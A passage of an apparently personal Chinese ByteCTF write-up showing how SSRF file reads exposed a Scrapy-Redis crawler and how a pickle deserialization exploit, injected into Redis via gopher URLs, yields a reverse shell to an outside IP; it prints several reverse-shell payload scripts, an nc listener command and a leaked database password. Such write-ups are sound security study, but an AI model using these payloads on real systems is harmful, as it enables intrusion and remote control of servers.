routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/bytectf/setting.py&quot;</span>&gt;（凭感觉在写代码。。）<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/bytectf/settings.py&quot;</span>&gt;<br><br></code></pre></td></tr></table></figure><p>？？？做着做着访问不了了（希望环境没事🙏。等待几分钟后环境恢复，估计是在重启。</p><p>参考上面的处理方法，将返回结果整理如下：（参考教程：<a href="https://www.cnblogs.com/fengf233/p/11400262.html%EF%BC%89">https://www.cnblogs.com/fengf233/p/11400262.html）</a></p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta"># setting.py</span><br><br>BOT_NAME = <span class="hljs-string">&#x27;bytectf&#x27;</span><br><span class="hljs-meta"># 此Scrapy项目名称</span><br><br>SPIDER_MODULES = [<span class="hljs-string">&#x27;bytectf.spiders&#x27;</span>]<br><span class="hljs-meta"># scrapy查找spider的路径</span><br><br>NEWSPIDER_MODULE = <span class="hljs-string">&#x27;bytectf.spiders&#x27;</span><br><span class="hljs-meta"># 指定使用genspider时创建spider的路径</span><br><br>RETRY_ENABLED = False<br><span class="hljs-meta"># </span><br>ROBOTSTXT_OBEY = False<br><span class="hljs-meta"># 表示遵不遵守君子协议，默认False</span><br><br>DOWNLOAD_TIMEOUT = <span class="hljs-number">8</span><br><span class="hljs-meta"># 超时时间</span><br><br>USER_AGENT = <span class="hljs-string">&#x27;scrapy_redis&#x27;</span><br><span class="hljs-meta"># 爬虫时使用的默认User-Agent</span><br><br>SCHEDULER = <span class="hljs-string">&quot;scrapy_redis.scheduler.Scheduler&quot;</span><br><span class="hljs-meta"># </span><br><br>DUPEFILTER_CLASS = <span class="hljs-string">&quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;</span><br><span class="hljs-meta"># </span><br><br>REDIS_HOST = <span class="hljs-string">&#x27;172.20.0.7&#x27;</span><br><span class="hljs-meta"># redis 服务器地址</span><br><br>REDIS_PORT = <span class="hljs-number">6379</span><br><span class="hljs-meta"># redis 端口</span><br><br>ITEM_PIPELINES = &#123;<br><span class="hljs-string">&#x27;bytectf.pipelines.BytectfPipeline&#x27;</span>: <span class="hljs-number">300</span>,<br>&#125;<br><span class="hljs-meta"># 启用的item管道</span><br></code></pre></td></tr></table></figure><p>在其他人的题解中，他们尝试了攻击 redis，但是没有拿到 shell。我不会（暂时就不尝试了。在这个文件中没有 spider 的名称，考虑从  <strong>init</strong>.py 这个已知的文件入手。尝试读取  <strong>init</strong>.py 文件。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/bytectf/spiders/__init__.py&quot;</span>&gt;<br><br></code></pre></td></tr></table></figure><p>没有数据</p><p>尝试读取 byte.py 文件（暂时还不清楚这个文件名「byte.py」的来源，猜测可能在 items.py、pipelines.py、bytectf/<strong>init</strong>.py 这些没有读取的文件中）。折腾了半天才在启动命令中发现爬虫的名称叫做 byte.py，当时没有理解这个命令的含义，血亏。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/bytectf/spiders/byte.py&quot;</span>&gt;<br><br></code></pre></td></tr></table></figure><p>将回显结果进行整理。代码有点乱，Python 的缩进全无，只能依靠猜测源码大致的模样（\x 乱码使用 print(b””.decode(“utf-8”) 转换为中文)）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment"># byte.py</span><br><br><span class="hljs-keyword">import</span> scrapy<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> scrapy_redis.spiders <span class="hljs-keyword">import</span> RedisSpider<br><span class="hljs-keyword">from</span> bytectf.items <span class="hljs-keyword">import</span> BytectfItem<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ByteSpider</span>(<span class="hljs-params">RedisSpider</span>):</span><br>    name = <span class="hljs-string">&#x27;byte&#x27;</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse</span>(<span class="hljs-params">self, response</span>):</span><br>        byte_item = BytectfItem()<br>        <span class="hljs-comment"># 主键，原始 url</span><br>        byte_item[<span class="hljs-string">&#x27;byte_start&#x27;</span>] = response.request.url<br>        url_list = []<br>        test = response.xpath(<span class="hljs-string">&#x27;//a/@href&#x27;</span>).getall()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> test:<br>            <span class="hljs-keyword">if</span> i[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;/&#x27;</span>:<br>                url = response.request.url + i<br>            <span class="hljs-keyword">else</span>:<br>                url = i<br>            <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">r&#x27;://&#x27;</span>, url):<br>                r = scrapy.Request(url, callback=self.parse2, dont_filter=<span class="hljs-literal">True</span>)<br>                r.meta[<span class="hljs-string">&#x27;item&#x27;</span>] = byte_item<br>                <span class="hljs-keyword">yield</span> r<br>            url_list.append(url)<br>            <span class="hljs-keyword">if</span>(len(url_list) &gt; <span class="hljs-number">3</span>):<br>                <span class="hljs-keyword">break</span><br>        byte_item[<span class="hljs-string">&#x27;byte_url&#x27;</span>] = response.request.url<br>        byte_item[<span class="hljs-string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        <span class="hljs-keyword">yield</span> byte_item<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse2</span>(<span class="hljs-params">self, response</span>):</span><br>        item = response.meta[<span class="hljs-string">&#x27;item&#x27;</span>]<br>        item[<span class="hljs-string">&#x27;byte_url&#x27;</span>] = response.request.url<br>        item[<span class="hljs-string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        <span class="hljs-keyword">yield</span> item<br><br></code></pre></td></tr></table></figure><p>尝试读取前面猜测的文件，items.py、pipelines.py、bytectf/<strong>init</strong>.py</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/bytectf/items.py&quot;</span>&gt;<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/bytectf/pipelines.py&quot;</span>&gt;<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;file:///proc/self/cwd/bytectf/__init__.py&quot;</span>&gt;<br><br></code></pre></td></tr></table></figure><p>回显结果：</p><ol><li>items.py<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># items.py</span><br><br><span class="hljs-comment"># Define here the models for your scraped items</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># See documentation in:</span><br><span class="hljs-comment"># https://docs.scrapy.org/en/latest/topics/items.html</span><br><span class="hljs-keyword">import</span> scrapy<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BytectfItem</span>(<span class="hljs-params">scrapy.Item</span>):</span><br>    <span class="hljs-comment"># define the fields for your item here like:</span><br>    <span class="hljs-comment"># name = scrapy.Field()</span><br>    byte_start = scrapy.Field()  <span class="hljs-comment"># 起始页面</span><br>    byte_url = scrapy.Field()  <span class="hljs-comment"># 当前页面</span><br>    byte_text = scrapy.Field()  <span class="hljs-comment"># text</span><br><br></code></pre></td></tr></table></figure></li><li>pipelines.py（等等，N0rth3 怎么那么熟悉，出题人可还行，没注意）<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># pipelines.py</span><br><br><span class="hljs-keyword">import</span> pymongo<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BytectfPipeline</span>:</span><br>    <span class="hljs-comment"># 连接数据库</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-comment"># 获取数据库连接信息</span><br>        MONGODB_HOST = <span class="hljs-string">&#x27;172.20.0.8&#x27;</span><br>        MONGODB_PORT = <span class="hljs-number">27017</span><br>        MONGODB_DBNAME = <span class="hljs-string">&#x27;result&#x27;</span><br>        MONGODB_TABLE = <span class="hljs-string">&#x27;result&#x27;</span><br>        MONGODB_USER = <span class="hljs-string">&#x27;N0rth3&#x27;</span><br>        MONGODB_PASSWD = <span class="hljs-string">&#x27;E7B70D0456DAD39E22735E0AC64A69AD&#x27;</span><br>        mongo_client = pymongo.MongoClient(<br>            <span class="hljs-string">&quot;%s:%d&quot;</span> % (MONGODB_HOST, MONGODB_PORT))<br>        mongo_client[MONGODB_DBNAME].authenticate(<br>            MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME)<br>        mongo_db = mongo_client[MONGODB_DBNAME]<br>        self.table = mongo_db[MONGODB_TABLE]<br><span class="hljs-comment"># 处理item</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process_item</span>(<span class="hljs-params">self, item, spider</span>):</span><br><span class="hljs-comment"># 使用dict转换item，然后插入数据库</span><br>    quote_info = dict(item)<br>    print(quote_info)<br>    self.table.insert(quote_info)<br>    <span class="hljs-keyword">return</span> item<br><br></code></pre></td></tr></table></figure></li><li>bytectf/<strong>init</strong>.py：空</li></ol><p>爬虫源码非常简单，全部文件读出来还会发现内网有一台 mongodb 其实为了防止大家跑偏这台 mongodb 特意加了密码，简单想一下就会发现并没有什么能利用的（原因：redis 机器的 ip 不是 localhost，所以拿到 shell 也没用），然后我们继续分析爬虫的源码（不是很能理解）。也就是其中的这段代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment"># byte.py 片段</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse</span>(<span class="hljs-params">self, response</span>):</span><br>        byte_item = BytectfItem()<br>        <span class="hljs-comment"># 主键，原始 url</span><br>        byte_item[<span class="hljs-string">&#x27;byte_start&#x27;</span>] = response.request.url<br>        url_list = []<br>        test = response.xpath(<span class="hljs-string">&#x27;//a/@href&#x27;</span>).getall()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> test:<br>            <span class="hljs-keyword">if</span> i[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;/&#x27;</span>:<br>                url = response.request.url + i<br>            <span class="hljs-keyword">else</span>:<br>                url = i<br>            <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">r&#x27;://&#x27;</span>, url):<br>                r = scrapy.Request(url, callback=self.parse2, dont_filter=<span class="hljs-literal">True</span>)<br>                r.meta[<span class="hljs-string">&#x27;item&#x27;</span>] = byte_item<br>                <span class="hljs-keyword">yield</span> r<br>            url_list.append(url)<br>            <span class="hljs-keyword">if</span>(len(url_list) &gt; <span class="hljs-number">3</span>):<br>                <span class="hljs-keyword">break</span><br>        byte_item[<span class="hljs-string">&#x27;byte_url&#x27;</span>] = response.request.url<br>        byte_item[<span class="hljs-string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>        <span class="hljs-keyword">yield</span> byte_item<br><br></code></pre></td></tr></table></figure><p>可以看到是用 scrapy_redis 写的一个爬虫，功能即接收url，抓取其中的 url 链接然后爬取。</p><h2 id="Python反序列化"><a href="#Python反序列化" class="headerlink" title="Python反序列化"></a>Python反序列化</h2><p>文件基本读取完成，整理一下已知信息：（分析数据流，然后分析数据流中间危险函数）</p><ol><li>web 应用将任务传给redis，redis做为 broker（dumps）</li><li>爬虫从这个 broker 处获取任务，最后将任务的结果存入 mongodb，最基础的一套分布式应用架构（loads）。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/AB748B08-5068-48EF-B8EC-536FEB650AAC.png"><br>pickle 函数！！！Python 反序列化漏洞，目前可以确定漏洞类型为 Python 反序列化。</li></ol><p>题解的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment"># exp1.py</span><br><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span>(<span class="hljs-params">object</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        s = <span class="hljs-string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;120.55.50.65&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> (os.system, (s,))<br><br><br>test = str(pickle.dumps(exp()))<br>poc = test.replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&#x27;\\n&#x27;</span>).replace(<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;\\\&quot;&quot;</span>)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]<br>poc =<span class="hljs-string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="hljs-string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="hljs-string">&#x27;&quot;&#x27;</span>)<br>print(poc)<br><br></code></pre></td></tr></table></figure><p>将其中的 vps 地址和端口改为自己的，在自己的服务器运行 nc -lvvp 9999，将生成的 payload 在 <a href="http://101.200.50.18:30010/result?url=http://120.55.50.65/1.html">http://101.200.50.18:30010/result?url=http://120.55.50.65/1.html</a> 的 url= 之后，即可 get shell。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/F195950B-B1C3-4F53-AEC0-E9502B8ED0AC.png"><br>最后得到 flag 为 ByteCTF{59c9c566-1167-4f66-950e-043fe53a1db5}</p><h2 id="拆解exp"><a href="#拆解exp" class="headerlink" title="拆解exp"></a>拆解exp</h2><p>exp 中知识盲区太多。可以考虑整理过后基础补充吧（Nnn 大佬还提供一种思路——打 redis），整理后的 exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment"># exp2.py</span><br><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span>(<span class="hljs-params">object</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        s = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">            python -c  &#x27;import socket,subprocess,os;</span><br><span class="hljs-string">                        </span><br><span class="hljs-string">                        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="hljs-string">                        s.connect((&quot;120.55.50.65&quot;,9999));</span><br><span class="hljs-string">                        os.dup2(s.fileno(),0);</span><br><span class="hljs-string">                        os.dup2(s.fileno(),1);</span><br><span class="hljs-string">                        os.dup2(s.fileno(),2);</span><br><span class="hljs-string">                        p=subprocess.call(</span><br><span class="hljs-string">                                            [&quot;/bin/sh&quot;,&quot;-i&quot;]</span><br><span class="hljs-string">                                          );</span><br><span class="hljs-string">                        &#x27;</span><br><span class="hljs-string">            &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> (os.system, (s,))<br><br><br>test = str(pickle.dumps(exp()))<br>poc = test.replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&#x27;\\n&#x27;</span>).replace(<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;\\\&quot;&quot;</span>)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]<br>poc =<span class="hljs-string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="hljs-string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="hljs-string">&#x27;&quot;&#x27;</span>)<br>print(poc)<br><br></code></pre></td></tr></table></figure><p>接下来就一点点分析这个 exp，然后自己尝试些 exp。</p><h3 id="python反弹shell"><a href="#python反弹shell" class="headerlink" title="python反弹shell"></a>python反弹shell</h3><p>我将那段 <code>__reduce__</code>中的代码在本地进行执行，测试 bash 命令的正确性。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/DF0CABC7-4537-44C8-8289-28A1F9C990A2.png"><br>从上图可以看出，经过整理后的 bash 命令不能执行，也就印证了 exp2 生成的 payload 无法反弹 shell。</p><p>在这里补了一下 Python 反弹 shell 的姿势。尝试使用自己的反弹 shell 脚本 反弹 shell。Python 反弹 shell 的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> os<br><br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>s.connect((<span class="hljs-string">&quot;120.55.50.65&quot;</span>, <span class="hljs-number">9999</span>))<br>os.dup2(s.fileno(), <span class="hljs-number">0</span>)<br>os.dup2(s.fileno(), <span class="hljs-number">1</span>)<br>os.dup2(s.fileno(), <span class="hljs-number">2</span>)<br>p = subprocess.call(<br>    [<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-i&quot;</span>]<br>)<br><br></code></pre></td></tr></table></figure><p>在 <a href="http://www.onelinerizer.com/">one-lined python 官网</a>生成一行的 python，并合成成命令</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><br>python -c &quot;(lambda <span class="hljs-strong">__g: [<span class="hljs-string">[[[(s.connect((&#x27;120.55.50.65&#x27;, 9999)), (os.dup2(s.fileno(), 0), (os.dup2(s.fileno(), 1), (os.dup2(s.fileno(), 2), [None for __g[&#x27;p&#x27;</span>] in [<span class="hljs-string">(subprocess.call([&#x27;/bin/sh&#x27;, &#x27;-i&#x27;</span>]))]][<span class="hljs-string">0</span>])[<span class="hljs-string">1</span>])[<span class="hljs-string">1</span>])[<span class="hljs-string">1</span>])[<span class="hljs-string">1</span>] for __</span>g[<span class="hljs-string">&#x27;s&#x27;</span>] in [<span class="hljs-string">(socket.socket(socket.AF_INET, socket.SOCK_STREAM))</span>]][<span class="hljs-string">0</span>] for <span class="hljs-strong">__g[<span class="hljs-string">&#x27;os&#x27;</span>] in [<span class="hljs-string">(__import__(&#x27;os&#x27;, __g, __g))</span>]][<span class="hljs-string">0</span>] for __</span>g[<span class="hljs-string">&#x27;subprocess&#x27;</span>] in [<span class="hljs-string">(__import__(&#x27;subprocess&#x27;, __g, __g))</span>]][<span class="hljs-string">0</span>] for <span class="hljs-strong">__g[<span class="hljs-string">&#x27;socket&#x27;</span>] in [<span class="hljs-string">(__import__(&#x27;socket&#x27;, __g, __g))</span>]][0])(globals())&quot;</span><br><span class="hljs-strong"></span><br></code></pre></td></tr></table></figure><p>将替换原 exp 中的 反弹 shell 脚本，得到脚本：（注意引号问题）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span>(<span class="hljs-params">object</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        s = <span class="hljs-string">&quot;&quot;&quot;python -c \&quot;(lambda __g: [[[[(s.connect((&#x27;120.55.50.65&#x27;, 9999)), (os.dup2(s.fileno(), 0), (os.dup2(s.fileno(), 1), (os.dup2(s.fileno(), 2), [None for __g[&#x27;p&#x27;] in [(subprocess.call([&#x27;/bin/sh&#x27;, &#x27;-i&#x27;]))]][0])[1])[1])[1])[1] for __g[&#x27;s&#x27;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#x27;os&#x27;] in [(__import__(&#x27;os&#x27;, __g, __g))]][0] for __g[&#x27;subprocess&#x27;] in [(__import__(&#x27;subprocess&#x27;, __g, __g))]][0] for __g[&#x27;socket&#x27;] in [(__import__(&#x27;socket&#x27;, __g, __g))]][0])(globals())\&quot;&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> (os.system, (s,))<br><br>test = str(pickle.dumps(exp()))<br>poc = test.replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&#x27;\\n&#x27;</span>).replace(<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;\\\&quot;&quot;</span>)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]<br>poc =<span class="hljs-string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="hljs-string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="hljs-string">&#x27;&quot;&#x27;</span>)<br>print(poc)<br><br></code></pre></td></tr></table></figure><h3 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h3><p>最后需要看懂 poc 的 前半部分，就是下面这一小块：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><br><span class="hljs-symbol">gopher:</span><span class="hljs-comment">//172.20.0.7:6379/_ZADD byte:requests 0 &quot;“</span><br><br></code></pre></td></tr></table></figure><p>在此之前先去补充了一下 gopher 和 redis 的基本用法。并且题解中提到通过观察源码可以知道 scrapy_redis 它会将request对象存入爬虫名:requests这样的有序列表中。这里我有 2 个问题：</p><ol><li>使用 gopher 协议可以向 redis 插入数据？可以在本地进行测试。</li><li>为什么在 result= 之后可以 SSRF？怎么进行测试？<br>使用下面的 url 在本地进行测试，确实可以获取到数据。<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-comment"># 插入键和值</span><br><span class="hljs-attribute">curl</span> -v gopher://<span class="hljs-number">127.0.0.1:6379</span>/_set%<span class="hljs-number">20</span>runoobkey%<span class="hljs-number">20</span>redis<br><span class="hljs-comment"># 获取值</span><br><span class="hljs-attribute">curl</span> -v gopher://<span class="hljs-number">127.0.0.1:6379</span>/_get%<span class="hljs-number">20</span>runoobkey<br><br></code></pre></td></tr></table></figure></li></ol><p>通过前面读取源码，可以知道 host</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><br><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>     localhost<br>::<span class="hljs-number">1</span>           localhost ip6-localhost ip6-loopback<br>fe00::<span class="hljs-number">0</span>       ip6-localnet<br>ff00::<span class="hljs-number">0</span>       ip6-mcastprefix<br>ff02::<span class="hljs-number">1</span>       ip6-allnodes<br>ff02::<span class="hljs-number">2</span>       ip6-allrouters<br><span class="hljs-number">172.20</span><span 